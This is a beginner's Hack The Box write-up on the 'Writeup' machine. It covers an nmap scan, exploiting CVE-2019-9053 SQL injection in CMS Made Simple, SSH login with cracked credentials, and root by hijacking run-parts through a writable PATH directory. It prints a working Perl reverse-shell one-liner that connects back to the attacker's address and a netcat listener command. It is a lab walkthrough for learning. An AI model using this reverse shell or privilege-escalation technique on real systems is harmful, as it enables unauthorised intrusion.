# Welcome to myWriteup!

Hi there!

I am b3yond1xx7 and here's a brief intro about me; 

I am just a newbie in Infosec Industry, Capture-the-flag and also, in doing boxes on Hackthebox. 
I want to focus on DFIR but i also want to learn some pentesting approaches, methodologies and techniques so Hackthebox is a great help.

Actually this is my first writeup of all the three (3) machines i have owned. 

I hope you will enjoy this and also, please correct me if there are some things that i have misunderstood about the machine and process or please do feel free to reach me out and help me improve my understanding about the concepts because it will help me a lot. Thanks! 

# HTB-Writeup

Maybe if you are also a newbie in infosec/pentesting field like me, you may not heard yet about [**Hackthebox.eu**](https://www.hackthebox.eu).
Well, **Hack The Box** is simply just an online platform allowing you to test and advance your skills in cyber security. Just click the link, hack your way in and start the fun.

So, let's start!

![HTB-Writeup Website1](images/infocard.PNG)

As a brief description about this machine, it is an easy-rated box created by [**jkr**](https://twitter.com/ATeamJKR), which taught me about how to use the exploit for one of the CMS Made Simple vulnerability and also ***PATH*** highjacking.

## Recon
Initially, i run nmap to scan the machine and to look for those open ports and services that usually can be used for exploitation.
**Nmap** uses raw IP packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. (From man pages of nmap on Kali)

This is the nmap syntax i have used. (Well, definitely this is based from [**IppSec**](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)'s methodologies. Visit him for hackthebox machine writeup videos and more!)
```markdown
nmap -sC -sV -oA Writeup 10.10.10.138
```
**-sC =**
           Performs a script scan using the default set of scripts. It is equivalent to --script=default. Some of the scripts in
           this category are considered intrusive and should not be run against a target network without permission.

**-sV =** (Version detection)-sC
           Performs a script scan using the default set of scripts. It is equivalent to --script=default. Some of the scripts in
           this category are considered intrusive and should not be run against a target network without permission.

**-oA =** basename (Output to all formats)
           As a convenience, you may specify -oA basename to store scan results in normal, XML, and grepable formats at once.
           They are stored in basename.nmap, basename.xml, and basename.gnmap, respectively. 
           
```markdown
# Nmap 7.70 scan initiated Wed Sep 25 01:04:13 2019 as: nmap -sC -sV -oA Writeup 10.10.10.138
Nmap scan report for 10.10.10.138
Host is up (0.26s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 25 01:04:48 2019 -- 1 IP address (1 host up) scanned in 35.05 seconds
```

## Port Enumeration

After the scan, i saw those open ports 22 and 80 (which is for **(22)SSH** and **(80)HTTP**). 
Usually, after doing nmap i am trying to look for the vulnerabilities of the open services and applications the machine are using and if there are available exploits that can be used to take advantages of that vulnerability.

I've tried to search for the vulnerabilities of the **OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)** and **Apache httpd 2.4.25** but there is none much related.

Then that's the time i've accessed the port 80 and saw this website.

![HTB-Writeup Website1](images/website1.PNG)

At first, there is a rabbit hole in the website stating about the **Eyeore DOS Protection Script** but it is not much related to the machine or maybe it's just telling us not to brute-force the machine. Then i went back again to review my nmap scan and noticed the **robots.txt**

A **robots.txt** file tells search engine crawlers which pages or files the crawler can or can't request from your site.
 
 ```markdown
 80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
 ```
 When i accessed the robots.txt this is the output
 
 ![HTB-Writeup robots.txt](images/robots.PNG)

Of course we are trying to hack our way in to own this machine so, i still try to access the **/writeup** directory and saw this unfinished web page of the owner.
 
 ![HTB-Writeup /writeup](images/writeup.PNG)
 
 To be honest i was stucked at this part, i just stare at the unfinished website for almost an hour and having no idea what to do on this one. But it comes to my mind to view the source code and noticed something.
 
 ```markdown
 <!doctype html>
<html lang="en_US"><head>
	<title>Home - writeup</title>
	
<base href="http://10.10.10.138/writeup/" />
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

	<!-- cms_stylesheet error: No stylesheets matched the criteria specified -->
<style>.footer { background-color: white; position: fixed; left: 0; bottom: 0; width: 100%; color: black; text-align: center; }</style>
</head><body>
	<header id="header">
		<h1>writeup</h1>
	</header>

	<nav id="menu">
		
<ul><li class="currentpage"><a class="currentpage" href="http://10.10.10.138/writeup/">Home Page</a></li><li><a href="http://10.10.10.138/writeup/index.php?page=ypuffy">ypuffy</a></li><li><a href="http://10.10.10.138/writeup/index.php?page=blue">blue</a></li><li><a href="http://10.10.10.138/writeup/index.php?page=writeup">writeup</a></li></ul>
	</nav>

	<section id="content">
		<h1>Home</h1>
		<p>After many month of lurking around on HTB I also decided to start writing about the boxes I hacked. In the upcoming days, weeks and month you will find more and more content here as I am about to convert my famous incomplete notes into pretty write-ups.</p>
<p>I am still searching for someone to provide or make a cool theme. If you are interested, please contact me on&nbsp;<a href="https://mm.netsecfocus.com/">NetSec Focus Mattermost</a>. Thanks.</p>	</section>
<div class="footer">
  <p>Pages are hand-crafted with vim. NOT.</p>
</div>

</body>

</html>
 ```
### CMS Made Simple

The website was created in CMS Made Simple. It is an Open Source Content Management System that was built using PHP and the Smarty Engine, which keeps content, functionality, and templates separated. 

After knowing what technology the machine was using, i tried to look for vulnerabilities and exploit for CMSMS and found something interesting that may be used to get the user.

![HTB-Writeup /notcracked](images/exploit.PNG)

```markdown
#!/usr/bin/env python
#Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
#Date: 30-03-2019
#Exploit Author: Daniele Scanu @ Certimeter Group
#Vendor Homepage: https://www.cmsmadesimple.org/
#Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
#Version: <= 2.2.9
#Tested on: Ubuntu 18.04 LTS
#CVE : CVE-2019-9053
```

## Getting User

I read the python file to check the usage of the exploit and found this

```markdown

[+] Specify an url target
[+] Example usage (no cracking password): exploit.py -u http://target-uri
[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist
[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.

```
I also noticed that it is a kind of time-based blind sql injection so, i can adjust the **TIME** variable to check what value will work.

```markdown

url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""

```

So i run the exploit using this syntax but it has errors

```markdown
python exploit.py -u http://10.10.10.138/writeup --crack -w /usr/share/wordlists/rockyou.txt
```

I am tried to edit the code because i think the default **TIME** value is not working which is one (1). I replaced it with 2, 3, 4, and 5 and at last, it works with the value five (5) 


```markdown

url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 5
db_name = ""
output = ""
email = ""

```

But unfortunately i only got this result

![HTB-Writeup /notcracked](images/notcracked.PNG)

At first, i thought i have to crack the password hash manually but it was time consuming so i tried to run the exploit again and finally, i got the credentials i am looking for.

![HTB-Writeup /notcracked](images/cracked.PNG)

I went back to the website and tried if /admin or /admin.php where i can use those credentials i've got.

![HTB-Writeup /notcracked](images/admiin.PNG)

I tried and tried to login on that /admin but it is not working. Then, i remembered that there is an open port for SSH and i tried to remotely login using the username **jkr** and the password **raykayjay9**

```markdown
ssh jkr@10.10.10.138
jkr@10.10.10.138's password:
...

jkr@writeup:~$ ls -l
total 3012
-rwxr-xr-x 1 jkr  jkr  3078592 Oct  7 01:09 pspy
-r--r--r-- 1 root root      33 Apr 19 08:43 user.txt
```
Just simply logging in thru SSH, i am now the user ***JKR*** and found the user.txt in the directory **/home/jkr**

Now let's go root this machine!

## Getting Root

i run the **pspy64** process monitor then saw something fishy

```markdown
/bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1
```
it has a UID=0 which means that this process is ran by root. Then, while staring at the output of pspy64, i noticed again another unfamiliar process that is running with UID=0.

### Run-parts
```markdown
sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd
.d > /run/motd.dynamic.new
```

I observed that this process is prompting in the pspy64 every time there is a successful authentication through SSH.  

![HTB-Writeup /notcracked](images/runparts.PNG)

***run-parts*** runs all the executable files named within constraints described below, found in directory directory.  Other files and directories are silently ignored.

***--lsbsysinit*** option is also given,  then  the  names  must  not  end  in  .dpkg-old   or .dpkg-dist  or  .dpkg-new  or  .dpkg-tmp.

At first, i try to modify the **/etc/update-motd.d** to put my reverse shell on, because it is where the run-parts run executable files but its not working. Then later on i have realized that it's the run parts that i have to overwrite then. 

I noticed also this part

```markdown
sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Which is setting the /usr/local/sbin as the priority path when we will be running commands. After that i tried to cd on that directory and observe if i can create a file under it and it works!

```markdown
jkr@writeup:/usr/local/sbin$ nano test
jkr@writeup:/usr/local/sbin$
```
This is the time i have set up my listener to know if it will work as well.

```markdown
nc -nlvp 1338
```

After that, i created again another file which i named run-parts with a perl reverse shell inside. Why perl reverse shell? At first the bash reverse shell is not working so i tried if it will work. Also, it is related with what i saw a while ago, the cleanup.pl. It is a perl script that i think removes the history actions taken by the users who try to access the machine. A wild guess. So this is what my perl reverse shell looks like.

```markdown
#!/bin/bash
perl -e 'use Socket;$i="10.10.12.22";$p=1338;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

I made the run-parts file that i've created as an executable file by the command **chmod +x run-parts**. As we know that the script is triggered when we try to login thru SSH, so i tried to log in again while my listener is waiting for a connection. 

![HTB-Writeup /notcracked](images/root.PNG)

And i'm in! I am now the root.

I didn't established a formal shell on this box because of time constraints but i was able to get the root.txt. 

Also, there are things that i wasn't able to understand well so please ping me for corrections and additional knowledge about this box and the concepts under this.

But still, i hope you learned something. Yey!











